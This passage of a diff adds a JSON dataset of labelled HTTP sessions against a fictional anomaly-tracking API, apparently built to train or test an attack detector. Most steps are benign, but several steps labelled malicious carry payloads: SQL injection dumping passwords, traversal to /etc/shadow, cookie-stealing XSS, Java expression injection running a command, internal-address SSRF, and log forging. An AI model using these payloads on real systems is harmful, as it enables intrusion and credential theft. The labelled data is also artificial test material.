+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "X-Trace-Info": "Tracing packet capture"
+        },
+        "body": null,
+        "note": "The client includes a debugging header mentioning packet capture."
+      },
+      {
+        "id": "sess049-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician49@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess049-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_049"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess049-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-omega-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_049"
+        },
+        "body": null,
+        "note": "The user checks an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess050",
+    "client_ip": "192.168.1.59",
+    "steps": [
+      {
+        "id": "sess050-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician50@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess050-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_050"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess050-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_050",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Anomaly Record",
+          "frequency_hz": 700,
+          "notes": "[http://127.0.0.1:22/](https://www.google.com/search?q=http://127.0.0.1:22/)"
+        },
+        "note": "Data error: relabeled from malicious. The private address is only the visible text of a link to a public host."
+      },
+      {
+        "id": "sess050-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/sessions/recent",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_050"
+        },
+        "body": null,
+        "note": "The user views recent sessions."
+      }
+    ]
+  },
+  {
+    "session_id": "sess051",
+    "client_ip": "192.168.1.60",
+    "steps": [
+      {
+        "id": "sess051-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician51@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess051-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_051"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess051-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-alpha-02/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_051",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "${T(java.lang.Runtime).getRuntime().exec('id')}"
+        },
+        "note": "The client attempts a Java template injection payload."
+      },
+      {
+        "id": "sess051-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-alpha-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_051"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess052",
+    "client_ip": "192.168.1.61",
+    "steps": [
+      {
+        "id": "sess052-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician52@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess052-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_052"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess052-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-beta-02/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_052",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "rO0ABXNyACpvcmcuYXBhY2hlLGNvbW1vbnM..."
+        },
+        "note": "The client attempts to send serialized object binary streams."
+      },
+      {
+        "id": "sess052-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-beta-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_052"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess053",
+    "client_ip": "192.168.1.62",
+    "steps": [
+      {
+        "id": "sess053-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {
+          "region": "Polar's edge"
+        },
+        "headers": {
+          "Accept": "application/json"
+        },
+        "body": null,
+        "note": "The client queries public stations with an apostrophe in the region."
+      },
+      {
+        "id": "sess053-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician53@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess053-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_053"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess053-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-gamma-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_053"
+        },
+        "body": null,
+        "note": "The user inspects an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess054",
+    "client_ip": "192.168.1.63",
+    "steps": [
+      {
+        "id": "sess054-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician54@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess054-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_054"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess054-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_054",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Log entry\n2026-10-28 10:43:03 FATAL [System] Memory corruption detected",
+          "frequency_hz": 800
+        },
+        "note": "The client attempts a log stamp injection payload."
+      },
+      {
+        "id": "sess054-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/sessions/recent",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_054"
+        },
+        "body": null,
+        "note": "The user views recent sessions."
+      }
+    ]
+  },
+  {
+    "session_id": "sess055",
+    "client_ip": "192.168.1.64",
+    "steps": [
+      {
+        "id": "sess055-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician55@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess055-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_055"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess055-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-delta-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_055"
+        },
+        "body": null,
+        "note": "The user opens an anomaly object."
+      },
+      {
+        "id": "sess055-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-delta-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_055"
+        },
+        "body": null,
+        "note": "The user checks another anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess056",
+    "client_ip": "192.168.1.65",
+    "steps": [
+      {
+        "id": "sess056-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)"
+        },
+        "body": null,
+        "note": "The client uses an old legacy browser user agent string."
+      },
+      {
+        "id": "sess056-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician56@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess056-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_056"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess056-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-epsilon-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_056"
+        },
+        "body": null,
+        "note": "The user checks an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess057",
+    "client_ip": "192.168.1.66",
+    "steps": [
+      {
+        "id": "sess057-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician57@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess057-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_057"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess057-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {
+          "limit": "10; WAITFOR DELAY '0:0:5'"
+        },
+        "headers": {
+          "Authorization": "Bearer token_057"
+        },
+        "body": null,
+        "note": "The client attempts a time-based query injection."
+      },
+      {
+        "id": "sess057-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-zeta-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_057"
+        },
+        "body": null,
+        "note": "The user checks an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess058",
+    "client_ip": "192.168.1.67",
+    "steps": [
+      {
+        "id": "sess058-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician58@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess058-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_058"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess058-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-restricted-77",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_058"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. The word restricted is only part of the id string."
+      },
+      {
+        "id": "sess058-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-eta-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_058"
+        },
+        "body": null,
+        "note": "The user views a valid anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess059",
+    "client_ip": "192.168.1.68",
+    "steps": [
+      {
+        "id": "sess059-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {
+          "region": "Basin's core"
+        },
+        "headers": {
+          "Accept": "application/json",
+          "X-Test-Flag": "active"
+        },
+        "body": null,
+        "note": "The client includes an apostrophe and a test header."
+      },
+      {
+        "id": "sess059-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician59@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess059-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_059"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess059-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-theta-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_059"
+        },
+        "body": null,
+        "note": "The user inspects an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess060",
+    "client_ip": "192.168.1.69",
+    "steps": [
+      {
+        "id": "sess060-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician60@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess060-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_060"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess060-s03",
+        "label": "malicious",
+        "method": "PUT",
+        "path": "/v1/anomalies/anomaly-iota-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_060",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Update",
+          "privilege": "root"
+        },
+        "note": "The client attempts to inject a privilege field."
+      },
+      {
+        "id": "sess060-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-iota-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_060"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess061",
+    "client_ip": "192.168.1.70",
+    "steps": [
+      {
+        "id": "sess061-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician61@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess061-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_061"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess061-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/anomalies/..%2f..%2fetc%2fshadow",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_061"
+        },
+        "body": null,
+        "note": "The client attempts URL-encoded traversal to shadow file."
+      },
+      {
+        "id": "sess061-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-kappa-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_061"
+        },
+        "body": null,
+        "note": "The user views an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess062",
+    "client_ip": "192.168.1.71",
+    "steps": [
+      {
+        "id": "sess062-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician62@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess062-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_062"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess062-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-lambda-03/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_062",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "<body onload=alert(document.cookie)>"
+        },
+        "note": "The client attempts an onload script execution payload."
+      },
+      {
+        "id": "sess062-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-lambda-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_062"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess063",
+    "client_ip": "192.168.1.72",
+    "steps": [
+      {
+        "id": "sess063-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "X-Debug-Header": "Internal network diagnostic"
+        },
+        "body": null,
+        "note": "The client includes a debugging header mentioning internal networks."
+      },
+      {
+        "id": "sess063-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician63@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess063-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_063"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess063-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-mu-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_063"
+        },
+        "body": null,
+        "note": "The user inspects an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess064",
+    "client_ip": "192.168.1.73",
+    "steps": [
+      {
+        "id": "sess064-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician64@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess064-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_064"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess064-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_064",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Anomaly Record",
+          "frequency_hz": 900,
+          "notes": "[http://10.0.0.2/admin](http://10.0.0.2/admin)"
+        },
+        "note": "The client attempts to target an internal network IP address."
+      },
+      {
+        "id": "sess064-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/sessions/recent",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_064"
+        },
+        "body": null,
+        "note": "The user views recent sessions."
+      }
+    ]
+  },
+  {
+    "session_id": "sess065",
+    "client_ip": "192.168.1.74",
+    "steps": [
+      {
+        "id": "sess065-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician65@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess065-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_065"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess065-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-nu-01/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_065",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "${7*7}"
+        },
+        "note": "The client attempts a template injection payload."
+      },
+      {
+        "id": "sess065-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-nu-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_065"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess066",
+    "client_ip": "192.168.1.75",
+    "steps": [
+      {
+        "id": "sess066-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician66@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess066-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_066"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess066-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-xi-02/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_066",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "rO0ABXNyACpvcmcu..."
+        },
+        "note": "The client attempts to send serialized object binary data."
+      },
+      {
+        "id": "sess066-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-xi-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_066"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess067",
+    "client_ip": "192.168.1.76",
+    "steps": [
+      {
+        "id": "sess067-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {
+          "region": "Ocean's floor"
+        },
+        "headers": {
+          "Accept": "application/json"
+        },
+        "body": null,
+        "note": "The client includes an apostrophe in the region query parameter."
+      },
+      {
+        "id": "sess067-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician67@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess067-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_067"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess067-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-omicron-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_067"
+        },
+        "body": null,
+        "note": "The user inspects an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess068",
+    "client_ip": "192.168.1.77",
+    "steps": [
+      {
+        "id": "sess068-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician68@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess068-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_068"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess068-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_068",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Entry\n2026-10-28 10:43:04 WARN [Auth] Privilege escalation attempt",
+          "frequency_hz": 450
+        },
+        "note": "The client attempts a log stamp injection payload."
+      },
+      {
+        "id": "sess068-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/sessions/recent",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_068"
+        },
+        "body": null,
+        "note": "The user views recent sessions."
+      }
+    ]
+  },
+  {
+    "session_id": "sess069",
+    "client_ip": "192.168.1.78",
+    "steps": [
+      {
+        "id": "sess069-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician69@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess069-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_069"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess069-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-pi-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_069"
+        },
+        "body": null,
+        "note": "The user opens an anomaly object."
+      },
+      {
+        "id": "sess069-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-pi-05",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_069"
+        },
+        "body": null,
+        "note": "The user checks another anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess070",
+    "client_ip": "192.168.1.79",
+    "steps": [
+      {
+        "id": "sess070-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
+        },
+        "body": null,
+        "note": "The client uses an old browser user agent string."
+      },
+      {
+        "id": "sess070-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician70@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess070-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_070"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess070-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-rho-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_070"
+        },
+        "body": null,
+        "note": "The user inspects an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess071",
+    "client_ip": "192.168.1.80",
+    "steps": [
+      {
+        "id": "sess071-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician71@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess071-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_071"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess071-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {
+          "limit": "10 UNION SELECT username, password FROM users"
+        },
+        "headers": {
+          "Authorization": "Bearer token_071"
+        },
+        "body": null,
+        "note": "The client attempts a UNION SQL injection query."
+      },
+      {
+        "id": "sess071-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-sigma-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_071"
+        },
+        "body": null,
+        "note": "The user checks an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess072",
+    "client_ip": "192.168.1.81",
+    "steps": [
+      {
+        "id": "sess072-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician72@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess072-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_072"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess072-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-unauthorized-66",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_072"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. The word unauthorized is only part of the id string."
+      },
+      {
+        "id": "sess072-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-tau-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_072"
+        },
+        "body": null,
+        "note": "The user views a valid anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess073",
+    "client_ip": "192.168.1.82",
+    "steps": [
+      {
+        "id": "sess073-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
